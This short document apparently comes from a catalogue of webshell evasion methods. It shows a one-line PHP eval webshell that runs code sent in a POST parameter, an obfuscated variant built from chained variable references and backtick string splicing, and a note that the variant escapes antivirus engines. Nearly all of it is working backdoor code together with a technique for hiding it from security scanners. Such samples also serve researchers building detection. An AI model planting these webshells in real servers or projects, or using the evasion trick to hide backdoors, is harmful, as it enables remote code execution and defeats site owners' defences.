Original webshell sample:

'''
<?php @eval($_POST['q']);?>
'''

Webshell obtained after using the corresponding method:

'''
<?php
$b = &$a;
$a = $_POST['q'];
$c = &$b;
eval(`/**123**/`.$c);
?>
'''

Description:

This method escapes the antivirus engine by using "&" multiple times to reference the previous variable, and then passing what is to be executed into the "eval" function through a series of assignments spliced with backquotes.
